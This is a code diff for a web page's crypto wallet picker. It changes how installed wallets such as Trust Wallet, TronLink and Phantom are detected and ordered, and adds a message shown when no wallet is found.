@@ -314,12 +314,6 @@ function isTrusteeWallet(wallet) {
   return String(wallet.name || '').toLowerCase().indexOf('trustee') !== -1;
 }
 
-function isPriorityWallet(wallet) {
-  const name = String(wallet.name || '').toLowerCase();
-  return ['metamask', 'coinbase', 'rainbow', 'okx', 'okex', 'bitget', 'bitkeep', 'tokenpocket', 'imtoken', 'safepal', 'phantom', 'blockchain']
-    .some(function (key) { return name.indexOf(key) !== -1; });
-}
-
 var TRUST_FALLBACK = {
   id: 'trust',
   name: 'Trust Wallet',
@@ -373,6 +367,8 @@ function installedHints() {
   if (/imToken/i.test(ua)) hints.push('imtoken');
   if (eth.isPhantom || /Phantom/i.test(ua)) hints.push('phantom');
   if (eth.isSafePal || /SafePal/i.test(ua)) hints.push('safepal');
+  if (window.tronLink || window.tronWeb || /TronLink/i.test(ua)) hints.push('tronlink', 'tron link');
+  if (/Blockchain/i.test(ua) && /wallet/i.test(ua)) hints.push('blockchain');
   return hints;
 }
 
@@ -447,17 +443,27 @@ function reopenSelectedWallet() {
 }
 
 function orderWalletList(all) {
-  const trust = all.find(isTrustWallet) || TRUST_FALLBACK;
-  const installed = all.filter(function (wallet) {
-    return isInstalledWallet(wallet) && !isTrustWallet(wallet) && !isTrusteeWallet(wallet);
+  const detected = all.filter(function (wallet) {
+    return isInstalledWallet(wallet) && !isTrusteeWallet(wallet);
   });
-  const rows = [{ id: trust.id, name: trust.name, image: trust.image, native: trust.native, universal: trust.universal, rdns: trust.rdns, recommended: true }];
-  installed.forEach(function (wallet) { rows.push(wallet); });
-  if (installed.length) return dedupeWallets(rows);
-  all.forEach(function (wallet) {
-    if (isTrustWallet(wallet) || isTrusteeWallet(wallet) || !isPriorityWallet(wallet)) return;
-    rows.push(wallet);
-  });
+  if (isInstalledWallet(TRUST_FALLBACK) && !detected.some(isTrustWallet)) {
+    detected.unshift(TRUST_FALLBACK);
+  }
+  const trust = detected.find(isTrustWallet);
+  const others = detected.filter(function (wallet) { return !isTrustWallet(wallet); });
+  const rows = [];
+  if (trust) {
+    rows.push({
+      id: trust.id,
+      name: trust.name,
+      image: trust.image,
+      native: trust.native,
+      universal: trust.universal,
+      rdns: trust.rdns,
+      recommended: true
+    });
+  }
+  others.forEach(function (wallet) { rows.push(wallet); });
   return dedupeWallets(rows);
 }
 
@@ -474,7 +480,7 @@ function renderWalletList(wallets) {
   const host = $('#m-wallet-list');
   if (!host) return;
   if (!wallets.length) {
-    host.innerHTML = '';
+    host.innerHTML = '<p style="color:var(--muted);font-size:13px;line-height:1.45">No wallet was detected in this browser. Open this page from the wallet app on this phone, then tap Apply now.</p>';
     return;
   }
   host.innerHTML = wallets.map(function (wallet) {
